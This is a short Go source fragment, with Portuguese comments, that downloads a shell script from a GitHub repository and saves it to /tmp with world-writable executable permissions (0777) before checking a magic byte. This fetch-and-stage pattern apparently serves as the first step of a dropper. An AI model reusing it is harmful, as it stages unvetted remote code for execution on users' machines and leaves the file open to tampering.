package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
)

func down_atila_vkzmn_sh() {

	url := []string{
       
	"https://github.com/atilabyte/IA/raw/refs/heads/main/down.sh",


	}

	for i, _ := range url {

		req := http.Client{}

		resp, err_get := req.Get(url[i])

		if err_get != nil {

			fmt.Println(err_get) //tente abaixa denovo

			continue

		}

		down_bytes, err_readall := ioutil.ReadAll(resp.Body)

		if err_readall != nil {

			fmt.Println("erro em readall")

			return

		}

		ioutil.WriteFile("/tmp/atila_vkzmn.sh", down_bytes, 0777)

		//verify  if  atila_vkzmn.sh  is  created , read the magic byte ATILA_VKZMN

		magic_byte()

	}

}
